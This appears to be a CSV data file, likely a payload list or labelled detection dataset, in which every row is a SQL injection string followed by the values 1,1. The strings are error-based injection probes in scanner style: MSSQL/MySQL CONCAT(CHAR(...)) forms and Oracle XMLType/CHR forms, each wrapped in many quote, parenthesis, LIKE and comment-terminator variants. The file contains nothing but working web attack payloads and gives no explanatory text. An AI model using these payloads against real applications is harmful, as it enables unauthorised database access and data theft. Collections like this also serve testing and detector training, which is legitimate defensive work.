"' AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- jeVF",1,1
""" AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- OazF",1,1
") AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (7124=7124",1,1
")) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ((6788=6788",1,1
"))) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (((6391=6391",1,1
" AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))",1,1
"') AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ('RoBr'='RoBr",1,1
"')) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (('IcaV'='IcaV",1,1
"'))) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ((('pCNO'='pCNO",1,1
"' AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND 'eCBH'='eCBH",1,1
"') AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ('NMCk' LIKE 'NMCk",1,1
"')) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (('ivkX' LIKE 'ivkX",1,1
"'))) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ((('RaOF' LIKE 'RaOF",1,1
"%' AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND 'EJiZ%'='EJiZ",1,1
"' AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND 'reBD' LIKE 'reBD",1,1
""") AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (""rszd""=""rszd",1,1
""")) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ((""abYs""=""abYs",1,1
"""))) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (((""yjzJ""=""yjzJ",1,1
""" AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ""Zfsl""=""Zfsl",1,1
""") AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (""nABx"" LIKE ""nABx",1,1
""")) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ((""zOZY"" LIKE ""zOZY",1,1
"""))) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND (((""BaJF"" LIKE ""BaJF",1,1
""" AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ""PCse"" LIKE ""PCse",1,1
" AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- kGKF",1,1
" AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))# vUaP",1,1
"' AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) OR 'ZBMl'='TtSU",1,1
"') WHERE 7779=7779 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- ewjF",1,1
""") WHERE 9480=9480 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- Xjiq",1,1
") WHERE 9637=9637 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- Zspx",1,1
"' WHERE 2059=2059 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- uhyQ",1,1
""" WHERE 1432=1432 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- eahB",1,1
" WHERE 5118=5118 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- nZEt",1,1
"'||(SELECT CHAR(115)+CHAR(106)+CHAR(114)+CHAR(88) WHERE 6557=6557 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))||'",1,1
"'||(SELECT CHAR(85)+CHAR(69)+CHAR(72)+CHAR(107) FROM DUAL WHERE 1254=1254 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))||'",1,1
"'+(SELECT CHAR(122)+CHAR(112)+CHAR(98)+CHAR(118) WHERE 6970=6970 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))+'",1,1
"||(SELECT CHAR(65)+CHAR(89)+CHAR(69)+CHAR(114) FROM DUAL WHERE 4353=4353 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))||",1,1
"||(SELECT CHAR(111)+CHAR(101)+CHAR(107)+CHAR(103) WHERE 9958=9958 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))||",1,1
"+(SELECT DqMA WHERE 5337=5337 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))+",1,1
"+(SELECT CHAR(84)+CHAR(98)+CHAR(73)+CHAR(81) WHERE 7318=7318 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))+",1,1
"')) AS DdbP WHERE 2171=2171 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- jLDR",1,1
""")) AS qOzW WHERE 1971=1971 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- dAub",1,1
")) AS TstR WHERE 7929=7929 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- SYKR",1,1
"') AS smEf WHERE 7378=7378 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- htAS",1,1
""") AS Uejr WHERE 3984=3984 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- AUCU",1,1
") AS bpaO WHERE 3423=3423 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- fYvQ",1,1
"` WHERE 9884=9884 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- OahZ",1,1
"`) WHERE 1934=1934 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))-- jPvE",1,1
"`=`` AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND ``=`",1,1
"""="""" AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)) AND """"=""",1,1
"]-(SELECT 0 WHERE 2946=2946 AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113)))|[",1,1
"' IN BOOLEAN MODE) AND 9959=CONCAT(CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),(SELECT (CASE WHEN (9959=9959) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(118)+CHAR(106)+CHAR(118)+CHAR(113))#",1,1
) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- wcQb,1,1
') AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- xnYy,1,1
' AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- peBI,1,1
""" AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- BgEl",1,1
) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (1403=1403,1,1
)) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((5296=5296,1,1
))) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (((9311=9311,1,1
 AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL),1,1
') AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('ROrS'='ROrS,1,1
')) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (('Eife'='Eife,1,1
'))) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((('ykIu'='ykIu,1,1
' AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'EExL'='EExL,1,1
') AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ('eqxZ' LIKE 'eqxZ,1,1
')) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (('coOV' LIKE 'coOV,1,1
'))) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((('rMgJ' LIKE 'rMgJ,1,1
%' AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'IsEf%'='IsEf,1,1
' AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'glKn' LIKE 'glKn,1,1
""") AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (""OCDb""=""OCDb",1,1
""")) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((""swtZ""=""swtZ",1,1
"""))) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (((""MWCL""=""MWCL",1,1
""" AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ""cNhE""=""cNhE",1,1
""") AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (""fvIW"" LIKE ""fvIW",1,1
""")) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((""Dpvj"" LIKE ""Dpvj",1,1
"""))) AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND (((""EaeO"" LIKE ""EaeO",1,1
""" AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ""lgNT"" LIKE ""lgNT",1,1
 AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- YKtg,1,1
 AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)# rmVJ,1,1
' AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) OR 'EjKi'='jVLj,1,1
') WHERE 5316=5316 AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- KGtA,1,1
""") WHERE 8019=8019 AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- oZXq",1,1
) WHERE 3085=3085 AND 6001=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (6001=6001) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)-- MMfr,1,1
